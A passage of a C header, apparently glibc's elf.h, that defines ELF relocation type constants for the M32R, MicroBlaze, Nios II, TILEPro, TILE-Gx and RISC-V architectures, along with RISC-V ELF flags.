#define R_M32R_26_PCREL		6	/* PC relative 26 bit shifted. */
#define R_M32R_HI16_ULO		7	/* High 16 bit with unsigned low. */
#define R_M32R_HI16_SLO		8	/* High 16 bit with signed low. */
#define R_M32R_LO16		9	/* Low 16 bit. */
#define R_M32R_SDA16		10	/* 16 bit offset in SDA. */
#define R_M32R_GNU_VTINHERIT	11
#define R_M32R_GNU_VTENTRY	12
/* M32R relocs use SHT_RELA.  */
#define R_M32R_16_RELA		33	/* Direct 16 bit. */
#define R_M32R_32_RELA		34	/* Direct 32 bit. */
#define R_M32R_24_RELA		35	/* Direct 24 bit. */
#define R_M32R_10_PCREL_RELA	36	/* PC relative 10 bit shifted. */
#define R_M32R_18_PCREL_RELA	37	/* PC relative 18 bit shifted. */
#define R_M32R_26_PCREL_RELA	38	/* PC relative 26 bit shifted. */
#define R_M32R_HI16_ULO_RELA	39	/* High 16 bit with unsigned low */
#define R_M32R_HI16_SLO_RELA	40	/* High 16 bit with signed low */
#define R_M32R_LO16_RELA	41	/* Low 16 bit */
#define R_M32R_SDA16_RELA	42	/* 16 bit offset in SDA */
#define R_M32R_RELA_GNU_VTINHERIT	43
#define R_M32R_RELA_GNU_VTENTRY	44
#define R_M32R_REL32		45	/* PC relative 32 bit.  */

#define R_M32R_GOT24		48	/* 24 bit GOT entry */
#define R_M32R_26_PLTREL	49	/* 26 bit PC relative to PLT shifted */
#define R_M32R_COPY		50	/* Copy symbol at runtime */
#define R_M32R_GLOB_DAT		51	/* Create GOT entry */
#define R_M32R_JMP_SLOT		52	/* Create PLT entry */
#define R_M32R_RELATIVE		53	/* Adjust by program base */
#define R_M32R_GOTOFF		54	/* 24 bit offset to GOT */
#define R_M32R_GOTPC24		55	/* 24 bit PC relative offset to GOT */
#define R_M32R_GOT16_HI_ULO	56	/* High 16 bit GOT entry with unsigned
					   low */
#define R_M32R_GOT16_HI_SLO	57	/* High 16 bit GOT entry with signed
					   low */
#define R_M32R_GOT16_LO		58	/* Low 16 bit GOT entry */
#define R_M32R_GOTPC_HI_ULO	59	/* High 16 bit PC relative offset to
					   GOT with unsigned low */
#define R_M32R_GOTPC_HI_SLO	60	/* High 16 bit PC relative offset to
					   GOT with signed low */
#define R_M32R_GOTPC_LO		61	/* Low 16 bit PC relative offset to
					   GOT */
#define R_M32R_GOTOFF_HI_ULO	62	/* High 16 bit offset to GOT
					   with unsigned low */
#define R_M32R_GOTOFF_HI_SLO	63	/* High 16 bit offset to GOT
					   with signed low */
#define R_M32R_GOTOFF_LO	64	/* Low 16 bit offset to GOT */
#define R_M32R_NUM		256	/* Keep this the last entry. */

/* MicroBlaze relocations */
#define R_MICROBLAZE_NONE		0	/* No reloc. */
#define R_MICROBLAZE_32 		1	/* Direct 32 bit. */
#define R_MICROBLAZE_32_PCREL		2	/* PC relative 32 bit. */
#define R_MICROBLAZE_64_PCREL		3	/* PC relative 64 bit. */
#define R_MICROBLAZE_32_PCREL_LO	4	/* Low 16 bits of PCREL32. */
#define R_MICROBLAZE_64 		5	/* Direct 64 bit. */
#define R_MICROBLAZE_32_LO		6	/* Low 16 bit. */
#define R_MICROBLAZE_SRO32		7	/* Read-only small data area. */
#define R_MICROBLAZE_SRW32		8	/* Read-write small data area. */
#define R_MICROBLAZE_64_NONE		9	/* No reloc. */
#define R_MICROBLAZE_32_SYM_OP_SYM	10	/* Symbol Op Symbol relocation. */
#define R_MICROBLAZE_GNU_VTINHERIT	11	/* GNU C++ vtable hierarchy. */
#define R_MICROBLAZE_GNU_VTENTRY	12	/* GNU C++ vtable member usage. */
#define R_MICROBLAZE_GOTPC_64		13	/* PC-relative GOT offset.  */
#define R_MICROBLAZE_GOT_64		14	/* GOT entry offset.  */
#define R_MICROBLAZE_PLT_64		15	/* PLT offset (PC-relative).  */
#define R_MICROBLAZE_REL		16	/* Adjust by program base.  */
#define R_MICROBLAZE_JUMP_SLOT		17	/* Create PLT entry.  */
#define R_MICROBLAZE_GLOB_DAT		18	/* Create GOT entry.  */
#define R_MICROBLAZE_GOTOFF_64		19	/* 64 bit offset to GOT. */
#define R_MICROBLAZE_GOTOFF_32		20	/* 32 bit offset to GOT. */
#define R_MICROBLAZE_COPY		21	/* Runtime copy.  */
#define R_MICROBLAZE_TLS		22	/* TLS Reloc. */
#define R_MICROBLAZE_TLSGD		23	/* TLS General Dynamic. */
#define R_MICROBLAZE_TLSLD		24	/* TLS Local Dynamic. */
#define R_MICROBLAZE_TLSDTPMOD32	25	/* TLS Module ID. */
#define R_MICROBLAZE_TLSDTPREL32	26	/* TLS Offset Within TLS Block. */
#define R_MICROBLAZE_TLSDTPREL64	27	/* TLS Offset Within TLS Block. */
#define R_MICROBLAZE_TLSGOTTPREL32	28	/* TLS Offset From Thread Pointer. */
#define R_MICROBLAZE_TLSTPREL32 	29	/* TLS Offset From Thread Pointer. */

/* Legal values for d_tag (dynamic entry type).  */
#define DT_NIOS2_GP             0x70000002 /* Address of _gp.  */

/* Nios II relocations.  */
#define R_NIOS2_NONE		0	/* No reloc.  */
#define R_NIOS2_S16		1	/* Direct signed 16 bit.  */
#define R_NIOS2_U16		2	/* Direct unsigned 16 bit.  */
#define R_NIOS2_PCREL16		3	/* PC relative 16 bit.  */
#define R_NIOS2_CALL26		4	/* Direct call.  */
#define R_NIOS2_IMM5		5	/* 5 bit constant expression.  */
#define R_NIOS2_CACHE_OPX	6	/* 5 bit expression, shift 22.  */
#define R_NIOS2_IMM6		7	/* 6 bit constant expression.  */
#define R_NIOS2_IMM8		8	/* 8 bit constant expression.  */
#define R_NIOS2_HI16		9	/* High 16 bit.  */
#define R_NIOS2_LO16		10	/* Low 16 bit.  */
#define R_NIOS2_HIADJ16		11	/* High 16 bit, adjusted.  */
#define R_NIOS2_BFD_RELOC_32	12	/* 32 bit symbol value + addend.  */
#define R_NIOS2_BFD_RELOC_16	13	/* 16 bit symbol value + addend.  */
#define R_NIOS2_BFD_RELOC_8	14	/* 8 bit symbol value + addend.  */
#define R_NIOS2_GPREL		15	/* 16 bit GP pointer offset.  */
#define R_NIOS2_GNU_VTINHERIT	16	/* GNU C++ vtable hierarchy.  */
#define R_NIOS2_GNU_VTENTRY	17	/* GNU C++ vtable member usage.  */
#define R_NIOS2_UJMP		18	/* Unconditional branch.  */
#define R_NIOS2_CJMP		19	/* Conditional branch.  */
#define R_NIOS2_CALLR		20	/* Indirect call through register.  */
#define R_NIOS2_ALIGN		21	/* Alignment requirement for
					   linker relaxation.  */
#define R_NIOS2_GOT16		22	/* 16 bit GOT entry.  */
#define R_NIOS2_CALL16		23	/* 16 bit GOT entry for function.  */
#define R_NIOS2_GOTOFF_LO	24	/* %lo of offset to GOT pointer.  */
#define R_NIOS2_GOTOFF_HA	25	/* %hiadj of offset to GOT pointer.  */
#define R_NIOS2_PCREL_LO	26	/* %lo of PC relative offset.  */
#define R_NIOS2_PCREL_HA	27	/* %hiadj of PC relative offset.  */
#define R_NIOS2_TLS_GD16	28	/* 16 bit GOT offset for TLS GD.  */
#define R_NIOS2_TLS_LDM16	29	/* 16 bit GOT offset for TLS LDM.  */
#define R_NIOS2_TLS_LDO16	30	/* 16 bit module relative offset.  */
#define R_NIOS2_TLS_IE16	31	/* 16 bit GOT offset for TLS IE.  */
#define R_NIOS2_TLS_LE16	32	/* 16 bit LE TP-relative offset.  */
#define R_NIOS2_TLS_DTPMOD	33	/* Module number.  */
#define R_NIOS2_TLS_DTPREL	34	/* Module-relative offset.  */
#define R_NIOS2_TLS_TPREL	35	/* TP-relative offset.  */
#define R_NIOS2_COPY		36	/* Copy symbol at runtime.  */
#define R_NIOS2_GLOB_DAT	37	/* Create GOT entry.  */
#define R_NIOS2_JUMP_SLOT	38	/* Create PLT entry.  */
#define R_NIOS2_RELATIVE	39	/* Adjust by program base.  */
#define R_NIOS2_GOTOFF		40	/* 16 bit offset to GOT pointer.  */
#define R_NIOS2_CALL26_NOAT	41	/* Direct call in .noat section.  */
#define R_NIOS2_GOT_LO		42	/* %lo() of GOT entry.  */
#define R_NIOS2_GOT_HA		43	/* %hiadj() of GOT entry.  */
#define R_NIOS2_CALL_LO		44	/* %lo() of function GOT entry.  */
#define R_NIOS2_CALL_HA		45	/* %hiadj() of function GOT entry.  */

/* TILEPro relocations.  */
#define R_TILEPRO_NONE		0	/* No reloc */
#define R_TILEPRO_32		1	/* Direct 32 bit */
#define R_TILEPRO_16		2	/* Direct 16 bit */
#define R_TILEPRO_8		3	/* Direct 8 bit */
#define R_TILEPRO_32_PCREL	4	/* PC relative 32 bit */
#define R_TILEPRO_16_PCREL	5	/* PC relative 16 bit */
#define R_TILEPRO_8_PCREL	6	/* PC relative 8 bit */
#define R_TILEPRO_LO16		7	/* Low 16 bit */
#define R_TILEPRO_HI16		8	/* High 16 bit */
#define R_TILEPRO_HA16		9	/* High 16 bit, adjusted */
#define R_TILEPRO_COPY		10	/* Copy relocation */
#define R_TILEPRO_GLOB_DAT	11	/* Create GOT entry */
#define R_TILEPRO_JMP_SLOT	12	/* Create PLT entry */
#define R_TILEPRO_RELATIVE	13	/* Adjust by program base */
#define R_TILEPRO_BROFF_X1	14	/* X1 pipe branch offset */
#define R_TILEPRO_JOFFLONG_X1	15	/* X1 pipe jump offset */
#define R_TILEPRO_JOFFLONG_X1_PLT 16	/* X1 pipe jump offset to PLT */
#define R_TILEPRO_IMM8_X0	17	/* X0 pipe 8-bit */
#define R_TILEPRO_IMM8_Y0	18	/* Y0 pipe 8-bit */
#define R_TILEPRO_IMM8_X1	19	/* X1 pipe 8-bit */
#define R_TILEPRO_IMM8_Y1	20	/* Y1 pipe 8-bit */
#define R_TILEPRO_MT_IMM15_X1	21	/* X1 pipe mtspr */
#define R_TILEPRO_MF_IMM15_X1	22	/* X1 pipe mfspr */
#define R_TILEPRO_IMM16_X0	23	/* X0 pipe 16-bit */
#define R_TILEPRO_IMM16_X1	24	/* X1 pipe 16-bit */
#define R_TILEPRO_IMM16_X0_LO	25	/* X0 pipe low 16-bit */
#define R_TILEPRO_IMM16_X1_LO	26	/* X1 pipe low 16-bit */
#define R_TILEPRO_IMM16_X0_HI	27	/* X0 pipe high 16-bit */
#define R_TILEPRO_IMM16_X1_HI	28	/* X1 pipe high 16-bit */
#define R_TILEPRO_IMM16_X0_HA	29	/* X0 pipe high 16-bit, adjusted */
#define R_TILEPRO_IMM16_X1_HA	30	/* X1 pipe high 16-bit, adjusted */
#define R_TILEPRO_IMM16_X0_PCREL 31	/* X0 pipe PC relative 16 bit */
#define R_TILEPRO_IMM16_X1_PCREL 32	/* X1 pipe PC relative 16 bit */
#define R_TILEPRO_IMM16_X0_LO_PCREL 33	/* X0 pipe PC relative low 16 bit */
#define R_TILEPRO_IMM16_X1_LO_PCREL 34	/* X1 pipe PC relative low 16 bit */
#define R_TILEPRO_IMM16_X0_HI_PCREL 35	/* X0 pipe PC relative high 16 bit */
#define R_TILEPRO_IMM16_X1_HI_PCREL 36	/* X1 pipe PC relative high 16 bit */
#define R_TILEPRO_IMM16_X0_HA_PCREL 37	/* X0 pipe PC relative ha() 16 bit */
#define R_TILEPRO_IMM16_X1_HA_PCREL 38	/* X1 pipe PC relative ha() 16 bit */
#define R_TILEPRO_IMM16_X0_GOT	39	/* X0 pipe 16-bit GOT offset */
#define R_TILEPRO_IMM16_X1_GOT	40	/* X1 pipe 16-bit GOT offset */
#define R_TILEPRO_IMM16_X0_GOT_LO 41	/* X0 pipe low 16-bit GOT offset */
#define R_TILEPRO_IMM16_X1_GOT_LO 42	/* X1 pipe low 16-bit GOT offset */
#define R_TILEPRO_IMM16_X0_GOT_HI 43	/* X0 pipe high 16-bit GOT offset */
#define R_TILEPRO_IMM16_X1_GOT_HI 44	/* X1 pipe high 16-bit GOT offset */
#define R_TILEPRO_IMM16_X0_GOT_HA 45	/* X0 pipe ha() 16-bit GOT offset */
#define R_TILEPRO_IMM16_X1_GOT_HA 46	/* X1 pipe ha() 16-bit GOT offset */
#define R_TILEPRO_MMSTART_X0	47	/* X0 pipe mm "start" */
#define R_TILEPRO_MMEND_X0	48	/* X0 pipe mm "end" */
#define R_TILEPRO_MMSTART_X1	49	/* X1 pipe mm "start" */
#define R_TILEPRO_MMEND_X1	50	/* X1 pipe mm "end" */
#define R_TILEPRO_SHAMT_X0	51	/* X0 pipe shift amount */
#define R_TILEPRO_SHAMT_X1	52	/* X1 pipe shift amount */
#define R_TILEPRO_SHAMT_Y0	53	/* Y0 pipe shift amount */
#define R_TILEPRO_SHAMT_Y1	54	/* Y1 pipe shift amount */
#define R_TILEPRO_DEST_IMM8_X1	55	/* X1 pipe destination 8-bit */
/* Relocs 56-59 are currently not defined.  */
#define R_TILEPRO_TLS_GD_CALL	60	/* "jal" for TLS GD */
#define R_TILEPRO_IMM8_X0_TLS_GD_ADD 61	/* X0 pipe "addi" for TLS GD */
#define R_TILEPRO_IMM8_X1_TLS_GD_ADD 62	/* X1 pipe "addi" for TLS GD */
#define R_TILEPRO_IMM8_Y0_TLS_GD_ADD 63	/* Y0 pipe "addi" for TLS GD */
#define R_TILEPRO_IMM8_Y1_TLS_GD_ADD 64	/* Y1 pipe "addi" for TLS GD */
#define R_TILEPRO_TLS_IE_LOAD	65	/* "lw_tls" for TLS IE */
#define R_TILEPRO_IMM16_X0_TLS_GD 66	/* X0 pipe 16-bit TLS GD offset */
#define R_TILEPRO_IMM16_X1_TLS_GD 67	/* X1 pipe 16-bit TLS GD offset */
#define R_TILEPRO_IMM16_X0_TLS_GD_LO 68	/* X0 pipe low 16-bit TLS GD offset */
#define R_TILEPRO_IMM16_X1_TLS_GD_LO 69	/* X1 pipe low 16-bit TLS GD offset */
#define R_TILEPRO_IMM16_X0_TLS_GD_HI 70	/* X0 pipe high 16-bit TLS GD offset */
#define R_TILEPRO_IMM16_X1_TLS_GD_HI 71	/* X1 pipe high 16-bit TLS GD offset */
#define R_TILEPRO_IMM16_X0_TLS_GD_HA 72	/* X0 pipe ha() 16-bit TLS GD offset */
#define R_TILEPRO_IMM16_X1_TLS_GD_HA 73	/* X1 pipe ha() 16-bit TLS GD offset */
#define R_TILEPRO_IMM16_X0_TLS_IE 74	/* X0 pipe 16-bit TLS IE offset */
#define R_TILEPRO_IMM16_X1_TLS_IE 75	/* X1 pipe 16-bit TLS IE offset */
#define R_TILEPRO_IMM16_X0_TLS_IE_LO 76	/* X0 pipe low 16-bit TLS IE offset */
#define R_TILEPRO_IMM16_X1_TLS_IE_LO 77	/* X1 pipe low 16-bit TLS IE offset */
#define R_TILEPRO_IMM16_X0_TLS_IE_HI 78	/* X0 pipe high 16-bit TLS IE offset */
#define R_TILEPRO_IMM16_X1_TLS_IE_HI 79	/* X1 pipe high 16-bit TLS IE offset */
#define R_TILEPRO_IMM16_X0_TLS_IE_HA 80	/* X0 pipe ha() 16-bit TLS IE offset */
#define R_TILEPRO_IMM16_X1_TLS_IE_HA 81	/* X1 pipe ha() 16-bit TLS IE offset */
#define R_TILEPRO_TLS_DTPMOD32	82	/* ID of module containing symbol */
#define R_TILEPRO_TLS_DTPOFF32	83	/* Offset in TLS block */
#define R_TILEPRO_TLS_TPOFF32	84	/* Offset in static TLS block */
#define R_TILEPRO_IMM16_X0_TLS_LE 85	/* X0 pipe 16-bit TLS LE offset */
#define R_TILEPRO_IMM16_X1_TLS_LE 86	/* X1 pipe 16-bit TLS LE offset */
#define R_TILEPRO_IMM16_X0_TLS_LE_LO 87	/* X0 pipe low 16-bit TLS LE offset */
#define R_TILEPRO_IMM16_X1_TLS_LE_LO 88	/* X1 pipe low 16-bit TLS LE offset */
#define R_TILEPRO_IMM16_X0_TLS_LE_HI 89	/* X0 pipe high 16-bit TLS LE offset */
#define R_TILEPRO_IMM16_X1_TLS_LE_HI 90	/* X1 pipe high 16-bit TLS LE offset */
#define R_TILEPRO_IMM16_X0_TLS_LE_HA 91	/* X0 pipe ha() 16-bit TLS LE offset */
#define R_TILEPRO_IMM16_X1_TLS_LE_HA 92	/* X1 pipe ha() 16-bit TLS LE offset */

#define R_TILEPRO_GNU_VTINHERIT	128	/* GNU C++ vtable hierarchy */
#define R_TILEPRO_GNU_VTENTRY	129	/* GNU C++ vtable member usage */

#define R_TILEPRO_NUM		130


/* TILE-Gx relocations.  */
#define R_TILEGX_NONE		0	/* No reloc */
#define R_TILEGX_64		1	/* Direct 64 bit */
#define R_TILEGX_32		2	/* Direct 32 bit */
#define R_TILEGX_16		3	/* Direct 16 bit */
#define R_TILEGX_8		4	/* Direct 8 bit */
#define R_TILEGX_64_PCREL	5	/* PC relative 64 bit */
#define R_TILEGX_32_PCREL	6	/* PC relative 32 bit */
#define R_TILEGX_16_PCREL	7	/* PC relative 16 bit */
#define R_TILEGX_8_PCREL	8	/* PC relative 8 bit */
#define R_TILEGX_HW0		9	/* hword 0 16-bit */
#define R_TILEGX_HW1		10	/* hword 1 16-bit */
#define R_TILEGX_HW2		11	/* hword 2 16-bit */
#define R_TILEGX_HW3		12	/* hword 3 16-bit */
#define R_TILEGX_HW0_LAST	13	/* last hword 0 16-bit */
#define R_TILEGX_HW1_LAST	14	/* last hword 1 16-bit */
#define R_TILEGX_HW2_LAST	15	/* last hword 2 16-bit */
#define R_TILEGX_COPY		16	/* Copy relocation */
#define R_TILEGX_GLOB_DAT	17	/* Create GOT entry */
#define R_TILEGX_JMP_SLOT	18	/* Create PLT entry */
#define R_TILEGX_RELATIVE	19	/* Adjust by program base */
#define R_TILEGX_BROFF_X1	20	/* X1 pipe branch offset */
#define R_TILEGX_JUMPOFF_X1	21	/* X1 pipe jump offset */
#define R_TILEGX_JUMPOFF_X1_PLT	22	/* X1 pipe jump offset to PLT */
#define R_TILEGX_IMM8_X0	23	/* X0 pipe 8-bit */
#define R_TILEGX_IMM8_Y0	24	/* Y0 pipe 8-bit */
#define R_TILEGX_IMM8_X1	25	/* X1 pipe 8-bit */
#define R_TILEGX_IMM8_Y1	26	/* Y1 pipe 8-bit */
#define R_TILEGX_DEST_IMM8_X1	27	/* X1 pipe destination 8-bit */
#define R_TILEGX_MT_IMM14_X1	28	/* X1 pipe mtspr */
#define R_TILEGX_MF_IMM14_X1	29	/* X1 pipe mfspr */
#define R_TILEGX_MMSTART_X0	30	/* X0 pipe mm "start" */
#define R_TILEGX_MMEND_X0	31	/* X0 pipe mm "end" */
#define R_TILEGX_SHAMT_X0	32	/* X0 pipe shift amount */
#define R_TILEGX_SHAMT_X1	33	/* X1 pipe shift amount */
#define R_TILEGX_SHAMT_Y0	34	/* Y0 pipe shift amount */
#define R_TILEGX_SHAMT_Y1	35	/* Y1 pipe shift amount */
#define R_TILEGX_IMM16_X0_HW0	36	/* X0 pipe hword 0 */
#define R_TILEGX_IMM16_X1_HW0	37	/* X1 pipe hword 0 */
#define R_TILEGX_IMM16_X0_HW1	38	/* X0 pipe hword 1 */
#define R_TILEGX_IMM16_X1_HW1	39	/* X1 pipe hword 1 */
#define R_TILEGX_IMM16_X0_HW2	40	/* X0 pipe hword 2 */
#define R_TILEGX_IMM16_X1_HW2	41	/* X1 pipe hword 2 */
#define R_TILEGX_IMM16_X0_HW3	42	/* X0 pipe hword 3 */
#define R_TILEGX_IMM16_X1_HW3	43	/* X1 pipe hword 3 */
#define R_TILEGX_IMM16_X0_HW0_LAST 44	/* X0 pipe last hword 0 */
#define R_TILEGX_IMM16_X1_HW0_LAST 45	/* X1 pipe last hword 0 */
#define R_TILEGX_IMM16_X0_HW1_LAST 46	/* X0 pipe last hword 1 */
#define R_TILEGX_IMM16_X1_HW1_LAST 47	/* X1 pipe last hword 1 */
#define R_TILEGX_IMM16_X0_HW2_LAST 48	/* X0 pipe last hword 2 */
#define R_TILEGX_IMM16_X1_HW2_LAST 49	/* X1 pipe last hword 2 */
#define R_TILEGX_IMM16_X0_HW0_PCREL 50	/* X0 pipe PC relative hword 0 */
#define R_TILEGX_IMM16_X1_HW0_PCREL 51	/* X1 pipe PC relative hword 0 */
#define R_TILEGX_IMM16_X0_HW1_PCREL 52	/* X0 pipe PC relative hword 1 */
#define R_TILEGX_IMM16_X1_HW1_PCREL 53	/* X1 pipe PC relative hword 1 */
#define R_TILEGX_IMM16_X0_HW2_PCREL 54	/* X0 pipe PC relative hword 2 */
#define R_TILEGX_IMM16_X1_HW2_PCREL 55	/* X1 pipe PC relative hword 2 */
#define R_TILEGX_IMM16_X0_HW3_PCREL 56	/* X0 pipe PC relative hword 3 */
#define R_TILEGX_IMM16_X1_HW3_PCREL 57	/* X1 pipe PC relative hword 3 */
#define R_TILEGX_IMM16_X0_HW0_LAST_PCREL 58 /* X0 pipe PC-rel last hword 0 */
#define R_TILEGX_IMM16_X1_HW0_LAST_PCREL 59 /* X1 pipe PC-rel last hword 0 */
#define R_TILEGX_IMM16_X0_HW1_LAST_PCREL 60 /* X0 pipe PC-rel last hword 1 */
#define R_TILEGX_IMM16_X1_HW1_LAST_PCREL 61 /* X1 pipe PC-rel last hword 1 */
#define R_TILEGX_IMM16_X0_HW2_LAST_PCREL 62 /* X0 pipe PC-rel last hword 2 */
#define R_TILEGX_IMM16_X1_HW2_LAST_PCREL 63 /* X1 pipe PC-rel last hword 2 */
#define R_TILEGX_IMM16_X0_HW0_GOT 64	/* X0 pipe hword 0 GOT offset */
#define R_TILEGX_IMM16_X1_HW0_GOT 65	/* X1 pipe hword 0 GOT offset */
#define R_TILEGX_IMM16_X0_HW0_PLT_PCREL 66 /* X0 pipe PC-rel PLT hword 0 */
#define R_TILEGX_IMM16_X1_HW0_PLT_PCREL 67 /* X1 pipe PC-rel PLT hword 0 */
#define R_TILEGX_IMM16_X0_HW1_PLT_PCREL 68 /* X0 pipe PC-rel PLT hword 1 */
#define R_TILEGX_IMM16_X1_HW1_PLT_PCREL 69 /* X1 pipe PC-rel PLT hword 1 */
#define R_TILEGX_IMM16_X0_HW2_PLT_PCREL 70 /* X0 pipe PC-rel PLT hword 2 */
#define R_TILEGX_IMM16_X1_HW2_PLT_PCREL 71 /* X1 pipe PC-rel PLT hword 2 */
#define R_TILEGX_IMM16_X0_HW0_LAST_GOT 72 /* X0 pipe last hword 0 GOT offset */
#define R_TILEGX_IMM16_X1_HW0_LAST_GOT 73 /* X1 pipe last hword 0 GOT offset */
#define R_TILEGX_IMM16_X0_HW1_LAST_GOT 74 /* X0 pipe last hword 1 GOT offset */
#define R_TILEGX_IMM16_X1_HW1_LAST_GOT 75 /* X1 pipe last hword 1 GOT offset */
#define R_TILEGX_IMM16_X0_HW3_PLT_PCREL 76 /* X0 pipe PC-rel PLT hword 3 */
#define R_TILEGX_IMM16_X1_HW3_PLT_PCREL 77 /* X1 pipe PC-rel PLT hword 3 */
#define R_TILEGX_IMM16_X0_HW0_TLS_GD 78	/* X0 pipe hword 0 TLS GD offset */
#define R_TILEGX_IMM16_X1_HW0_TLS_GD 79	/* X1 pipe hword 0 TLS GD offset */
#define R_TILEGX_IMM16_X0_HW0_TLS_LE 80	/* X0 pipe hword 0 TLS LE offset */
#define R_TILEGX_IMM16_X1_HW0_TLS_LE 81	/* X1 pipe hword 0 TLS LE offset */
#define R_TILEGX_IMM16_X0_HW0_LAST_TLS_LE 82 /* X0 pipe last hword 0 LE off */
#define R_TILEGX_IMM16_X1_HW0_LAST_TLS_LE 83 /* X1 pipe last hword 0 LE off */
#define R_TILEGX_IMM16_X0_HW1_LAST_TLS_LE 84 /* X0 pipe last hword 1 LE off */
#define R_TILEGX_IMM16_X1_HW1_LAST_TLS_LE 85 /* X1 pipe last hword 1 LE off */
#define R_TILEGX_IMM16_X0_HW0_LAST_TLS_GD 86 /* X0 pipe last hword 0 GD off */
#define R_TILEGX_IMM16_X1_HW0_LAST_TLS_GD 87 /* X1 pipe last hword 0 GD off */
#define R_TILEGX_IMM16_X0_HW1_LAST_TLS_GD 88 /* X0 pipe last hword 1 GD off */
#define R_TILEGX_IMM16_X1_HW1_LAST_TLS_GD 89 /* X1 pipe last hword 1 GD off */
/* Relocs 90-91 are currently not defined.  */
#define R_TILEGX_IMM16_X0_HW0_TLS_IE 92	/* X0 pipe hword 0 TLS IE offset */
#define R_TILEGX_IMM16_X1_HW0_TLS_IE 93	/* X1 pipe hword 0 TLS IE offset */
#define R_TILEGX_IMM16_X0_HW0_LAST_PLT_PCREL 94 /* X0 pipe PC-rel PLT last hword 0 */
#define R_TILEGX_IMM16_X1_HW0_LAST_PLT_PCREL 95 /* X1 pipe PC-rel PLT last hword 0 */
#define R_TILEGX_IMM16_X0_HW1_LAST_PLT_PCREL 96 /* X0 pipe PC-rel PLT last hword 1 */
#define R_TILEGX_IMM16_X1_HW1_LAST_PLT_PCREL 97 /* X1 pipe PC-rel PLT last hword 1 */
#define R_TILEGX_IMM16_X0_HW2_LAST_PLT_PCREL 98 /* X0 pipe PC-rel PLT last hword 2 */
#define R_TILEGX_IMM16_X1_HW2_LAST_PLT_PCREL 99 /* X1 pipe PC-rel PLT last hword 2 */
#define R_TILEGX_IMM16_X0_HW0_LAST_TLS_IE 100 /* X0 pipe last hword 0 IE off */
#define R_TILEGX_IMM16_X1_HW0_LAST_TLS_IE 101 /* X1 pipe last hword 0 IE off */
#define R_TILEGX_IMM16_X0_HW1_LAST_TLS_IE 102 /* X0 pipe last hword 1 IE off */
#define R_TILEGX_IMM16_X1_HW1_LAST_TLS_IE 103 /* X1 pipe last hword 1 IE off */
/* Relocs 104-105 are currently not defined.  */
#define R_TILEGX_TLS_DTPMOD64	106	/* 64-bit ID of symbol\'s module */
#define R_TILEGX_TLS_DTPOFF64	107	/* 64-bit offset in TLS block */
#define R_TILEGX_TLS_TPOFF64	108	/* 64-bit offset in static TLS block */
#define R_TILEGX_TLS_DTPMOD32	109	/* 32-bit ID of symbol\'s module */
#define R_TILEGX_TLS_DTPOFF32	110	/* 32-bit offset in TLS block */
#define R_TILEGX_TLS_TPOFF32	111	/* 32-bit offset in static TLS block */
#define R_TILEGX_TLS_GD_CALL	112	/* "jal" for TLS GD */
#define R_TILEGX_IMM8_X0_TLS_GD_ADD 113	/* X0 pipe "addi" for TLS GD */
#define R_TILEGX_IMM8_X1_TLS_GD_ADD 114	/* X1 pipe "addi" for TLS GD */
#define R_TILEGX_IMM8_Y0_TLS_GD_ADD 115	/* Y0 pipe "addi" for TLS GD */
#define R_TILEGX_IMM8_Y1_TLS_GD_ADD 116	/* Y1 pipe "addi" for TLS GD */
#define R_TILEGX_TLS_IE_LOAD	117	/* "ld_tls" for TLS IE */
#define R_TILEGX_IMM8_X0_TLS_ADD 118	/* X0 pipe "addi" for TLS GD/IE */
#define R_TILEGX_IMM8_X1_TLS_ADD 119	/* X1 pipe "addi" for TLS GD/IE */
#define R_TILEGX_IMM8_Y0_TLS_ADD 120	/* Y0 pipe "addi" for TLS GD/IE */
#define R_TILEGX_IMM8_Y1_TLS_ADD 121	/* Y1 pipe "addi" for TLS GD/IE */

#define R_TILEGX_GNU_VTINHERIT	128	/* GNU C++ vtable hierarchy */
#define R_TILEGX_GNU_VTENTRY	129	/* GNU C++ vtable member usage */

#define R_TILEGX_NUM		130

/* RISC-V ELF Flags */
#define EF_RISCV_RVC 			0x0001
#define EF_RISCV_FLOAT_ABI 		0x0006
#define EF_RISCV_FLOAT_ABI_SOFT 	0x0000
#define EF_RISCV_FLOAT_ABI_SINGLE 	0x0002
#define EF_RISCV_FLOAT_ABI_DOUBLE 	0x0004
#define EF_RISCV_FLOAT_ABI_QUAD 	0x0006
#define EF_RISCV_RVE			0x0008
#define EF_RISCV_TSO			0x0010

/* RISC-V relocations.  */
#define R_RISCV_NONE		 0
#define R_RISCV_32		 1
#define R_RISCV_64		 2
#define R_RISCV_RELATIVE	 3
#define R_RISCV_COPY		 4
#define R_RISCV_JUMP_SLOT	 5
#define R_RISCV_TLS_DTPMOD32	 6
#define R_RISCV_TLS_DTPMOD64	 7
#define R_RISCV_TLS_DTPREL32	 8
#define R_RISCV_TLS_DTPREL64	 9
#define R_RISCV_TLS_TPREL32	10
#define R_RISCV_TLS_TPREL64	11
#define R_RISCV_BRANCH		16
#define R_RISCV_JAL		17
#define R_RISCV_CALL		18
#define R_RISCV_CALL_PLT	19
#define R_RISCV_GOT_HI20	20
#define R_RISCV_TLS_GOT_HI20	21
#define R_RISCV_TLS_GD_HI20	22
#define R_RISCV_PCREL_HI20	23
#define R_RISCV_PCREL_LO12_I	24
#define R_RISCV_PCREL_LO12_S	25
#define R_RISCV_HI20		26
#define R_RISCV_LO12_I		27
#define R_RISCV_LO12_S		28
#define R_RISCV_TPREL_HI20	29
#define R_RISCV_TPREL_LO12_I	30
#define R_RISCV_TPREL_LO12_S	31
#define R_RISCV_TPREL_ADD	32
#define R_RISCV_ADD8		33
#define R_RISCV_ADD16		34
#define R_RISCV_ADD32		35
#define R_RISCV_ADD64		36
#define R_RISCV_SUB8		37
#define R_RISCV_SUB16		38
#define R_RISCV_SUB32		39
#define R_RISCV_SUB64		40
#define R_RISCV_GNU_VTINHERIT	41
#define R_RISCV_GNU_VTENTRY	42
#define R_RISCV_ALIGN		43
#define R_RISCV_RVC_BRANCH	44
#define R_RISCV_RVC_JUMP	45
#define R_RISCV_RVC_LUI		46
#define R_RISCV_GPREL_I		47
#define R_RISCV_GPREL_S		48
#define R_RISCV_TPREL_I		49
#define R_RISCV_TPREL_S		50
#define R_RISCV_RELAX		51
#define R_RISCV_SUB6		52
#define R_RISCV_SET6		53
#define R_RISCV_SET8		54
#define R_RISCV_SET16		55
#define R_RISCV_SET32		56
#define R_RISCV_32_PCREL	57
#define R_RISCV_IRELATIVE	58

#define R_RISCV_NUM		59

/* RISC-V specific values for the st_other field.  */
#define STO_RISCV_VARIANT_CC	0x80	/* Function uses variant calling
					   convention */

/* RISC-V specific values for the sh_type field.  */
